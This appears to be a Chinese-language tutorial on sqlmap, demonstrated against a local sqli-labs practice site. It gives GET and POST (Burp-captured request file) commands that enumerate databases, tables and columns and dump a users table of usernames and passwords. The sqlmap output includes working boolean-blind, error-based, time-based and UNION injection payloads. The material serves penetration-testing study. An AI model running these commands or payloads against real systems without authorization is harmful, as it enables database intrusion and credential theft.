## sqlmap 自动注入

### 简介：

&ensp; sqlmap 是一个开源渗透测试，它可以自动检测和利用SQL注入漏洞并接管数据库的过程。

#### GET 方法：

##### 简单参数：

* **-u**   &ensp; 检测注入点。

~~~makefile
sqlmap -u "http://127.0.0.1/sqli/Less-1/"
~~~

~~~makefile
09:46:59] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 3695=3695 AND 'Jypy'='Jypy

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 4202 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(4202=4202,1))),0x71716271BY x)a) AND 'ARVx'='ARVx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1396 FROM (SELECT(SLEEP(5)))qyXl) AND 'Pwzg'='Pwzg

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-6340' UNION ALL SELECT NULL,NULL,CONCAT(0x71717a6a71,0x58646f726d77634c4c7852676854555a616d6a47574
---
[09:47:09] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[09:47:19] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.1.100'
~~~



* **--dbs**  &ensp; 列出所有数据库。

~~~makefile
sqlmap -u "http://192.168.1.100/sqli/Less-1/?id=1" --dbs
~~~

~~~makefile
[09:49:56] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[09:49:56] [INFO] fetching database names
[09:50:01] [INFO] retrieved: 'information_schema'
[09:50:03] [INFO] retrieved: 'challenges'
[09:50:05] [INFO] retrieved: 'mysql'
[09:50:07] [INFO] retrieved: 'performance_schema'
[09:50:09] [INFO] retrieved: 'security'
[09:50:11] [INFO] retrieved: 'test'
available databases [6]:                                                                                          
[*] challenges
[*] information_schema
[*] mysql
[*] performance_schema
[*] security
[*] test
~~~



* **--current-db**  &ensp; 列出当前数据库的名字。

~~~makefile
sqlmap -u "http://192.168.1.100/sqli/Less-1/?id=1" --current-db
~~~

~~~makefile
[09:56:51] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[09:56:51] [INFO] fetching current database
current database: 'security'					# 当前数据库
~~~



* **-D**  &ensp; 指定一个数据库。
* **--tables**  &ensp; 列出表名。

~~~makefile
sqlmap -u "http://192.168.1.100/sqli/Less-1/?id=1" -D "security" --tables
~~~

~~~makefile
[10:05:07] [INFO] fetching tables for database: 'security'
[10:05:11] [INFO] retrieved: 'emails'
[10:05:13] [INFO] retrieved: 'referers'
[10:05:15] [INFO] retrieved: 'uagents'
[10:05:17] [INFO] retrieved: 'users'
Database: security                                                                                                
[4 tables]
+----------+
| emails   |
| referers |
| uagents  |
| users    |
+----------+
~~~



* **-T**  &ensp; 指定表名。
* **--columns**  &ensp; 列出所有的字段名。

~~~makefile
sqlmap -u "http://192.168.1.100/sqli/Less-1/?id=1" -D "security" -T "users" --columns
~~~

~~~makefile
Database: security                                                                                                
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+
~~~



* **-C** &ensp;  指定字段。
* **--dump**  &ensp;  列出字段内容。

~~~makefile
sqlmap -u "http://192.168.1.100/sqli/Less-1/?id=1" -D "security" -T "users" -C "username,password" --dump
~~~

~~~makefile
Database: security                                                                                                
Table: users
[13 entries]
+----------+------------+
| username | password   |
+----------+------------+
| Dumb     | Dumb       |
| Angelina | I-kill-you |
| Dummy    | p@ssword   |
| secure   | crappy     |
| stupid   | stupidity  |
| superman | genious    |
| batman   | mob!le     |
| admin    | admin      |
| admin1   | admin1     |
| admin2   | admin2     |
| admin3   | admin3     |
| dhakkan  | dumbo      |
| admin4   | admin4     |
+----------+------------+
~~~



#### POST 方法：

&ensp; post 自动注入基本和get自动注入差别不大，需要抓包。

**抓包工具：** Burp

**浏览器：** 	火狐 

**(1)** 打开浏览器随便输入值，这里我输入的是1，使用抓包工具将数据抓下来。

![1605704069977](C:\Users\goofiest\AppData\Roaming\Typora\typora-user-images\1605704069977.png)

可以看见抓包工具抓到了相关数据。

![1605704137004](C:\Users\goofiest\AppData\Roaming\Typora\typora-user-images\1605704137004.png)

**(2)** 将数据复制下来，以**txt**的格式保存下来。然后同 **sqlmap** 工具进行检测和注入。这里用的是**-r** 参数。

![1605705094458](C:\Users\goofiest\AppData\Roaming\Typora\typora-user-images\1605705094458.png)

**(3)** 后面的注入和 **get** 注入一样，跑命令。

 ~~~makefile
sqlmap -r post01.text --dbs		# 列出所有数据库。

sqlmap -r post01.text --current-db 		# 列出当前数据库的名字。

sqlmap -r post01.text -D "security" --tables	# 查询指定数据库的表名

等等
 ~~~

